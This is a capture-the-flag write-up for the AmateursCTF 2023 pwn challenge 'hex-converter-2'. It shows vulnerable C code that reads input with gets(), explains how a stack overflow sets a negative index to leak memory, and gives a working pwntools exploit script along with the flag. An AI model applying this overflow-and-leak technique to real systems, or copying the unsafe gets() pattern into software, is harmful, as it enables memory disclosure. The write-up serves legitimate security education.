# AmateursCTF 2023

## hex-converter-2

> Unvariant took a look at my hex-converter. Because he's a pwn god, he pwned it. So this time, I made it print in reverse order so you can't go backwards in the stack!
>
>  Author: stuxf
>
> [`chal.c`](chal.c) [`chal`](chal) [`Dockerfile`](Dockerfile)

Tags: _pwn_

## Solution
This is the follow up task to [`hex-converter`](../hex_converter/README.md). This time the code is slightly modified.

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    int i = 0;

    char name[16];
    printf("input text to convert to hex: \n");
    gets(name);

    char flag[64];
    fgets(flag, 64, fopen("flag.txt", "r"));
    // TODO: PRINT FLAG for cool people ... but maybe later

    while (1)
    {
        // the & 0xFF... is to do some typecasting and make sure only two characters are printed ^_^ hehe
        printf("%02X", (unsigned int)(name[i] & 0xFF));

        // exit out of the loop
        if (i <= 0)
        {
            printf("\n");
            return 0;
        }
        i--;
    }
}
```

Since the loop is backwards it's not possible to initialize i with a negative number as in the previous challenge. But since the check is done after the first character was read and printed we can still leak data located before `name` in memory by subsequently running the process and initializing `i` with different negative offsets.

```python
from pwn import *
import ctypes

result = b""
for i in range(-80, 0, 1):
    p = remote("amt.rs", 31631)
    #p = process("chal")
    payload = b""
    payload += 28*b"A"
    payload += p32(ctypes.c_uint(i).value)

    p.sendlineafter(b"convert to hex:", payload)
    print(p.recvline())
    foo = p.recvline()
    result = result + foo[0:-1]
    p.close()

result = result.decode()
result.rjust((len(result)//2)*2, "0")
print(bytes.fromhex(result))
```

Flag `amateursCTF{an0ther_e4sier_0ne_t0_offset_unvariant_while_l00p}`